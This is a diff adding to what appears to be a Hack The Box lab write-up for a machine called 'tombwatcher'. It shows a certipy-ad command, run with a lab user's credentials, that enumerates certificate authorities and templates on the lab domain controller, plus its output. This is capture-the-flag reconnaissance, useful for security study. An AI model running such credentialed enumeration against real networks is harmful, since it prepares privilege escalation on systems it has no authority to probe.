@@ -456,6 +456,56 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
+```
+certipy-ad find -u john -p 'newP@ssword2022' -dc-ip 10.129.144.23 -vulnerable -stdout                                  
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
+[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : tombwatcher-CA-1
+    DNS Name                            : DC01.tombwatcher.htb
+    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
+    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
+    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
+    Certificate Validity End            : 2123-11-16 00:57:48+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : TOMBWATCHER.HTB\Administrators
+      Access Rights
+        ManageCa                        : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        ManageCertificates              : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
+Certificate Templates                   : [!] Could not find any certificate templates
+                                            
+```
+
 ### Exploitation
 
 Step-by-step privilege escalation.
